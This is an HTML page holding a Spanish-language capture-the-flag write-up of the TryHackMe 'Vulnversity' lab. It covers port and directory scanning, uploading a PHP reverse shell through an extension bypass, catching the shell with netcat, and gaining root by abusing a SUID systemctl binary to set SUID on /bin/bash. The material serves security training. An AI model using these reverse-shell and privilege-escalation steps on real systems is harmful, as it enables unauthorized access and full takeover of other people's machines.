@@ -1,0 +1,717 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>tryhackme: vulnversity - Pentester - Ctf’s</title>
+<meta name="description" content="El mejor metodo de aprendizaje es practicando">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Pentester - Ctf's">
+<meta property="og:title" content="tryhackme: vulnversity">
+<meta property="og:url" content="http://localhost:4000/vulnversity/">
+
+
+  <meta property="og:description" content="El mejor metodo de aprendizaje es practicando">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/vulnversity/logo.jpeg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-11-10T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/vulnversity/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Deiby Espinosa",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Pentester - Ctf's Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">tryhackme: vulnversity</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/perfil.png" alt="Deiby Espinosa" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Deiby Espinosa</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Ingeniero de sistemas, entusiasta por la seguridad informatica.
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Bogota - Colombia</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+            <li><a href="https://github.com/DeibyPeralta" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+          
+            <li><a href="https://instagram.com/deiby.peralta" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram</a></li>
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:deibysp39@gmail.com">
+            <meta itemprop="email" content="deibysp39@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="tryhackme: vulnversity">
+    <meta itemprop="description" content="El mejor metodo de aprendizaje es practicando">
+    <meta itemprop="datePublished" content="November 10, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">tryhackme: vulnversity
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-11-10T00:00:00-05:00">November 10, 2021 </time>&emsp;
+          
+          
+        </p>
+        <h3 id="iniciamos-la-fase-de-reconocimiento">Iniciamos la fase de reconocimiento</h3>
+
+<p>Antes de iniciar, verificamos que la maquina este activa</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.249.39
+PING 10.10.249.39 <span class="o">(</span>10.10.249.39<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.249.39: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>1085 ms
+
+<span class="nt">---</span> 10.10.249.39 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 1085.220/1085.220/1085.220/0.000 ms
+</code></pre></div></div>
+
+<ul>
+  <li>Enviamos un ping y recivimos una respuesta, esta activa la maquinal</li>
+</ul>
+
+<p>Comprovamos que <em>OS</em> tiene la maquia antes de iniciar</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wichSystem.py 10.10.249.39
+
+10.10.249.39 <span class="o">(</span>ttl -&gt; 63<span class="o">)</span>: Linux
+</code></pre></div></div>
+
+<h3 id="reconnaissance">Reconnaissance</h3>
+
+<p>Iniciamos haciendo un primer escaneo con <em>nmap</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nb">sudo </span>nmap <span class="nt">--open</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> 10.10.249.39 <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<blockquote>
+  <p>Scan the box, how many ports are open?
+6</p>
+</blockquote>
+
+<p>Vemos que tiene 6 puertos abiertos, ahora a ver que servicios estan corriendo en cada uno</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> extractPorts allPorts
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.249.39
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 21,22,139,445,3128,3333
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<blockquote>
+  <p>What version of the squid proxy is running on the machine?
+3128/tcp open  http-proxy  Squid http proxy 3.5.12</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,22,139,445,3128,3333 10.10.249.39 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-10 01:29 <span class="nt">-05</span>
+Nmap scan report <span class="k">for </span>10.10.249.39
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a <span class="o">(</span>RSA<span class="o">)</span>
+|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 <span class="o">(</span>ED25519<span class="o">)</span>
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+3333/tcp open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Vuln University
+Service Info: Host: VULNUNIVERSITY<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span class="o">(</span>Samba 4.3.11-Ubuntu<span class="o">)</span>
+|   Computer name: vulnuniversity
+|   NetBIOS computer name: VULNUNIVERSITY<span class="se">\x</span>00
+|   Domain name: <span class="se">\x</span>00
+|   FQDN: vulnuniversity
+|_  System <span class="nb">time</span>: 2021-11-10T01:30:09-05:00
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: <span class="nt">-1s</span>
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-11-10T06:30:09
+|_  start_date: N/A
+|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>30.84 seconds
+</code></pre></div></div>
+<p>(Vamos respondiendo las preguntas de la maquina)</p>
+<blockquote>
+  <p>How many ports will nmap scan if the flag -p-400 was used?
+400</p>
+</blockquote>
+
+<blockquote>
+  <p>Using the nmap flag -n what will it not resolve?
+DNS</p>
+</blockquote>
+
+<blockquote>
+  <p>What is the most likely operating system this machine is running?
+Ubuntu</p>
+</blockquote>
+
+<blockquote>
+  <p>What port is the web server running on?
+3333</p>
+</blockquote>
+
+<h3 id="locating-directories-using-gobuster">Locating directories using GoBuster</h3>
+
+<p>En esta fase utilizaremos Gobuster para ver posibles <em>urls</em> existentes</p>
+
+<blockquote>
+  <p>What is the directory that has an upload form page?
+ /internal/</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.1.188:3333 <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-o</span> gobuster.txt
+
+<span class="o">===============================================================</span>
+2021/11/10 09:37:40 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 297]
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 297]
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.1.188:3333/css/]
+/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.1.188:3333/fonts/]
+/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.1.188:3333/images/]
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 33014]                                    
+/internal             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 320] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.1.188:3333/internal/]
+/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.1.188:3333/js/]      
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 301]                                        
+                                                                                       
+<span class="o">===============================================================</span>
+2021/11/10 09:39:13 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+<p>entramos en la ruta que encontramos con el anterior escaneo <em>http://10.10.1.188:3333/internal/</em> y encontramos que podemos subir
+un archivo en la maquina, probaremos obtener una <em>shell</em> mediante php</p>
+
+<p>para ello, modificaremos <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">esta</a> <em>shell</em> de php</p>
+
+<p><a href="/assets/images/vulnversity/server.png">cargar shell</a></p>
+
+<h3 id="compromise-the-webserver">Compromise the webserver</h3>
+
+<p>En esta parte podemos hacerlo de varios metodos, pero seguiremos la maquina y utilizaremos <em>burp suite</em></p>
+
+<blockquote>
+  <p>Run this attack, what extension is allowed?
+.phtml</p>
+</blockquote>
+
+<p><a href="/assets/images/vulnversity/shell.png">shell en el servidor</a></p>
+
+<p>ponemos nuestra maquina en escucha</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+connect to <span class="o">[</span>10.9.0.237] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.1.188] 57880
+Linux vulnuniversity 4.4.0-142-generic <span class="c">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 09:55:03 up 39 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+
+<ul>
+  <li>Estamos dentro de la maquina, ahora a buscar la flag 1</li>
+</ul>
+
+<blockquote>
+  <p>What is the name of the user who manages the webserver?
+bill</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>user.txt
+8xx7x92xbexax6xa22x63x6x00xcfxexb
+</code></pre></div></div>
+
+<blockquote>
+  <p>What is the user flag?
+8xdx99xxxfexaxadxxa6x36x1x0xcxcxxb</p>
+</blockquote>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+
+<p>la maquina nos da una ayuda, utilidar el comando <em>find / -user root -perm -4000 -exec ls -ldb {} \;</em>, sin embargo,
+tambien es valido utilizar <em>find / -perm -u=s -type f 2&gt;/dev/null</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null               
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+</code></pre></div></div>
+
+<blockquote>
+  <p>On the system, search for all SUID files. What file stands out?
+/bin/systemctl</p>
+</blockquote>
+
+<p>Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamos a utilizarlo para obtener privilegios root, con 
+los siguientes comandos.</p>
+
+<ol>
+  <li>Primero, creamos el archivo para la conexion de shell inversa</li>
+  <li>mediante el servicio creado le damos permisos <em>SUID</em> a <em>/bin/bash</em></li>
+  <li>confirmamos que somos usuarios <em>root</em> y leemos la flag
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span><span class="si">)</span>.service
+<span class="nb">echo</span> <span class="s1">'[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>
+/bin/systemctl <span class="nb">link</span> <span class="nv">$TF</span>
+/bin/systemctl <span class="nb">enable</span> <span class="nt">--now</span> <span class="nv">$TF</span>
+<span class="nv">$ </span><span class="o">&gt;</span> <span class="o">&gt;</span> <span class="o">&gt;</span> <span class="o">&gt;</span> <span class="nv">$ </span>Created symlink from /etc/systemd/system/tmp.0KBttF7QOg.service to /tmp/tmp.0KBttF7QOg.service.
+<span class="nv">$ </span>Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.0KBttF7QOg.service to /tmp/tmp.0KBttF7QOg.service.
+<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
+<span class="nt">-rwsr-sr-x</span> 1 root root 1037528 May 16  2017 /bin/bash
+<span class="nv">$ </span>bash <span class="nt">-p</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+<span class="nb">cat</span> /root/root.txt
+x5xfxxxx9fxax27x36xd3xax9x6c7xd5
+</code></pre></div>    </div>
+    <blockquote>
+      <p>Become root and get the last flag (/root/root.txt)
+x5xfx85x9x0x9x7x6xd33ax9x6cxfx5</p>
+    </blockquote>
+  </li>
+</ol>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#burp-suite" class="page__taxonomy-item" rel="tag">Burp suite</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#gobuster" class="page__taxonomy-item" rel="tag">Gobuster</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#nmap" class="page__taxonomy-item" rel="tag">Nmap</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">tryhackme</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-11-10T00:00:00-05:00">November 10, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Secret/" class="pagination--pager" title="Hackthebox: Secret
+">Previous</a>
+    
+    
+      <a href="/blue/" class="pagination--pager" title="tryhackme: blue
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Deiby Espinosa</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
